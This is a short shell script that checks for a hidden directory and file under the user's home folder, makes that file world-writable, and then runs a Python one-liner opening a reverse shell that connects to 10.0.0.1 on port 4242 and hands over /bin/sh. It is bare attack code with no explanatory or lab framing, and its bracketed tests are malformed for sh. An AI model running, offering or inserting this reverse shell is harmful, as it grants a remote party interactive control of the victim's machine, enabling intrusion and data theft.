#!/bin/sh

if [[! -d $HOME/.bs]]
then
	exit 1
fi

bsdir=$HOME/.bs

if [[! -f $bsdir/.bsp.py]]
then
	exit 1
fi

chmod 777 $bsdir/.bsp.py

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
